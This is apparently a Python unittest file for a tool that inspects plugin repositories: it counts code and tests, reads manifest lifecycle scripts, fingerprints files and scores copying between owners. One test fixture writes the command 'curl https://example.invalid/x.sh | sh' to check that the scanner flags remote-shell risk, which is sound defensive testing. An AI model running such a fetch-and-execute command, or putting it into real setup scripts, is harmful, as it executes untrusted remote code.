import json
import os
from pathlib import Path
import tempfile
import unittest

from gems.inspection import copy_overlap, inspect_tree


def write(root, relative, text):
    path = Path(root) / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def source(lines, salt=""):
    return "".join(f"const value{salt}{index} = {index};\n" for index in range(lines))


class InspectTreeTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)

    def plugin(self):
        write(self.root, "package.json", json.dumps({
            "name": "dsh-example", "main": "lib/index.js",
            "dsh": {"bundle": {"patch": "./cordis.patch.yml"}},
            "scripts": {"test": "node --test", "postinstall": "node setup.js"},
            "dependencies": {"a": "1", "b": "2"},
        }))
        write(self.root, "cordis.patch.yml", "plugins: {}\n")
        write(self.root, "lib/index.js", source(60))
        write(self.root, "lib/helper.js", source(30, "h"))
        write(self.root, "test/index.test.js", source(25, "t"))
        write(self.root, "README.md", "# Example\n\n## Install\n\n```sh\nnpm i\n```\n" + "words " * 300)
        write(self.root, "LICENSE", "MIT")
        write(self.root, ".github/workflows/ci.yml", "on: push\n")
        write(self.root, "node_modules/dep/index.js", source(500, "d"))

    def test_measures_a_real_plugin(self):
        self.plugin()
        result = inspect_tree(self.root)
        self.assertEqual(result["kind"], "plugin")
        self.assertEqual(result["code"]["files"], 2)
        self.assertEqual(result["code"]["lines"], 90)
        self.assertEqual(result["tests"], {"files": 1, "lines": 25})
        manifest = result["manifest"]
        self.assertTrue(manifest["declares_plugin"] and manifest["patch_file_present"] and manifest["entry_present"])
        self.assertEqual(manifest["lifecycle_scripts"], ["postinstall"])
        self.assertTrue(manifest["has_test_script"])
        self.assertEqual(manifest["dependency_count"], 2)
        self.assertEqual(result["practices"], {"ci": True, "license": True, "changelog": False})
        self.assertEqual(result["docs"]["readme_headings"], 2)
        self.assertEqual(result["docs"]["readme_code_blocks"], 1)
        self.assertEqual(len(result["fingerprints"]), 2)

    def test_result_holds_numbers_and_fingerprints_but_no_file_text(self):
        self.plugin()
        write(self.root, "lib/secret.js", "const token = 'PRIVATE-STRING-123';\n" * 30)
        self.assertNotIn("PRIVATE-STRING-123", json.dumps(inspect_tree(self.root)))

    def test_labels_prompt_packs_stubs_and_unmanifested_code(self):
        write(self.root, "README.md", "# Prompts\n" + "prompt text " * 600)
        self.assertEqual(inspect_tree(self.root)["kind"], "prompt pack")
        other = tempfile.TemporaryDirectory()
        self.addCleanup(other.cleanup)
        write(other.name, "index.js", source(5))
        self.assertEqual(inspect_tree(other.name)["kind"], "stub")
        write(other.name, "big.js", source(80))
        self.assertEqual(inspect_tree(other.name)["kind"], "code without a plugin manifest")

    def test_ignores_minified_bundles_and_counts_risk_hints(self):
        self.plugin()
        write(self.root, "lib/bundle.min.js", "var a=1;" * 4000 + "\n")
        write(self.root, "scripts/setup.sh", "curl https://example.invalid/x.sh | sh\n")
        result = inspect_tree(self.root)
        self.assertEqual(result["code"]["generated_files"], 1)
        self.assertEqual(result["risk_hints"], {"remote_shell": 1})

    def test_does_not_follow_links_out_of_the_tree(self):
        self.plugin()
        outside = tempfile.TemporaryDirectory()
        self.addCleanup(outside.cleanup)
        secret = write(outside.name, "outside.js", source(100, "o"))
        os.symlink(secret, self.root / "lib" / "linked.js")
        write(self.root, "package.json", json.dumps({"main": "../" + Path(outside.name).name + "/outside.js"}))
        result = inspect_tree(self.root)
        self.assertEqual(result["code"]["files"], 2)
        self.assertFalse(result["manifest"]["entry_present"])

    def test_survives_a_broken_manifest(self):
        write(self.root, "package.json", "{not json")
        write(self.root, "index.js", source(50))
        result = inspect_tree(self.root)
        self.assertTrue(result["manifest"]["present"])
        self.assertFalse(result["manifest"]["valid"])


class CopyOverlapTests(unittest.TestCase):
    def test_shared_files_under_another_owner_count_as_copied(self):
        inspections = {
            "alice/original": {"fingerprints": ["a", "b", "c", "d"]},
            "bob/copy": {"fingerprints": ["a", "b", "c", "z"]},
            "alice/sibling": {"fingerprints": ["a", "q"]},
            "carol/empty": {"fingerprints": []},
        }
        overlap = copy_overlap(inspections)
        self.assertEqual(overlap["bob/copy"], 0.75)
        self.assertEqual(overlap["alice/original"], 0.75)
        # Sharing only with your own other repository is not copying.
        self.assertEqual(overlap["alice/sibling"], 0.5)
        self.assertEqual(overlap["carol/empty"], 0.0)


if __name__ == "__main__":
    unittest.main()
